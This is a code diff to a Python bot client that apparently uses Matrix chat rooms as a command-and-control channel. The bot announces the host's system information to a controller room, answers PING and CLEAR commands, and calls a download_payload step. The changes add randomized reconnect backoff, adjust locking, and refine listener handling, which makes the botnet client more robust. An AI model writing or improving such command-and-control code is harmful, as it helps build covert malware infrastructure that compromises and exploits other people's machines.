@@ -1,5 +1,6 @@
 import json
 import platform
+import random
 import socket
 import threading
 import time
@@ -32,7 +33,7 @@ class Bot:
     command_listener: uuid.UUID
     
     last_ping: float = 0
-    ping_timeout_treshold: float = 9
+    ping_timeout_treshold: float = 15
     
     def __init__(self):
         self.got_room = False
@@ -62,18 +63,16 @@ class Bot:
             
     def join_room(self, roomid) -> Room:
         # check if already joined, if not join the room
-        with self.room_lock:
-            try:
-                room: Room = self.client.rooms[roomid]
-            except KeyError:
-                room: Room = self.client.join_room(roomid)
-            return room
+        try:
+            room: Room = self.client.rooms[roomid]
+        except KeyError:
+            room: Room = self.client.join_room(roomid)
+        return room
         
     def announce(self):
-        with self.room_lock:
-            self.announce_room.send_text(
-                f"CONNECT:{self.get_system_info()}"
-            )
+        self.announce_room.send_text(
+            f"CONNECT:{self.get_system_info()}"
+        )
         
     def stop(self):
         self.announce_room.send_text(
@@ -145,28 +144,34 @@ class Bot:
         _, command = msgbody.split(":", 1)
         if command == "PING":
             with self.room_lock:
+                if not self.got_room:
+                    return
                 self.announce_room.send_text(
-                    f"PONG:{self.command_room.room_id}:{self.bot_id}"
+                    f"PONG:{self.command_room.room_id}:{self.bot_id}:{time.time()}"
                 )
             with self.ping_lock:
                 self.last_ping = time.time()
                 
         elif command.startswith("CLEAR"):
             command, targets = command.split(":", 1)
-            print("RECEIVED CLEAR")
             if targets == "ALL":
+                print("RECEIVED ALL CLEAR")
                 with self.room_lock:
                     self.command_room.leave()
                 self.start_room_search()
             elif targets == self.bot_id:
+                print("RECEIVED INDIVIDUAL CLEAR")
                 self.start_room_search()
-                
+
         else:
             print(msgbody)
             
     def make_announcement_listener(self) -> uuid.UUID:
-        with self.room_lock:
+        if len(self.announce_room.listeners) == 0:
             return self.announce_room.add_listener(self.on_announcement, event_type="m.room.message")
+        else:
+            print("Already listening on announcement room")
+            return self.announce_room.listeners[0]
     
     def check_pings(self):
         while True:
@@ -189,7 +194,7 @@ class Bot:
     def start_room_search(self):
         with self.room_lock:
             self.got_room = False
-            
+
             # clean up
             try:
                 self.command_room.remove_listener(self.command_listener)
@@ -199,26 +204,24 @@ class Bot:
             self.command_room = None
             self.command_listener = None
             
-            # set announcement listener if not already set
-            if not self.announce_listener and self.announce_room:
-                self.announce_listener = self.make_announcement_listener()
+            # randomized backoff to prevent simultaneous reconnects
+            time.sleep(random.uniform(1, 3))
+            
+            self.announce_listener = self.make_announcement_listener()
         
     def announcement_loop(self):
         while True:
-            should_announce = False
             with self.room_lock:
-                should_announce = not self.got_room
-            if should_announce:
-                self.announce()
+                if not self.got_room:
+                    self.announce()
             time.sleep(5)
             
     def run(self):
         self.login()
         self.announce_room = self.join_room(ANNOUNCE_ROOM_ID)
         # make sure joining and syncing is done before proceding
-        time.sleep(2)
+        time.sleep(1)
                 
-        self.announce_listener = self.make_announcement_listener()
         self.client.start_listener_thread()
         
         self.download_payload()
